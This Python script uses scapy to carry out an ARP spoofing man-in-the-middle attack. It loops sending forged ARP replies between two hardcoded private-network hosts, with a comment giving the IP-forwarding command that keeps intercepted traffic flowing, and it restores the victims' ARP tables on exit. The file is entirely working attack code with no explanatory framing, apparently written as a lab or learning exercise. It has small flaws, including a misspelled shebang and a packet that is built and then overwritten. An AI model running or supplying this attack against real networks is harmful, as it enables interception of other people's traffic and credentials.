#!/usr/bin/eny python

## echo 1 > /proc/sys/net/ipv4/ip_forward

import scapy.all as scapy
import time
import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def spoof(target_host, spoof_host):
    target_mac = get_mac(target_host)
    packet = scapy.Ether(dst=target_mac)/scapy.ARP(op=2, pdst=target_host, hwdst=target_mac, psrc=spoof_host)
    # op=2  means "is-at"
    packet = scapy.ARP(op=2, pdst=target_host, hwdst=target_mac, psrc=spoof_host)

    #packet.show()
    ## verbose
    scapy.send(packet, verbose=False)


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast =  broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print("No answer from " + ip)
        return None

def clean_target_arp_table(destination_host, source_host):
    destionation_mac = get_mac(destination_host)
    source_mac = get_mac(source_host)
    # without psrc scapy uses the mac address of the host
    packet = scapy.ARP(op=2, pdst=destination_host, hwdst=destionation_mac, psrc=source_host, hwsrc=source_mac)
    scapy.send(packet, count=5, verbose=False)


packet_counter = 0
target1_host = "192.168.220.128"
target2_host = "192.168.220.7"

try:
    while True:
        spoof(target1_host, target2_host)
        spoof(target2_host, target1_host)
        # not added \n 
        print ("\rSpoofing packets sent: " + str(packet_counter), end="")
        packet_counter +=2
        time.sleep(1)
except KeyboardInterrupt:
    print("Cleaning targets arp tables....wait")
    clean_target_arp_table(target1_host,target2_host)
    clean_target_arp_table(target2_host,target1_host)
    print ("\nShutting down spoofer\n")
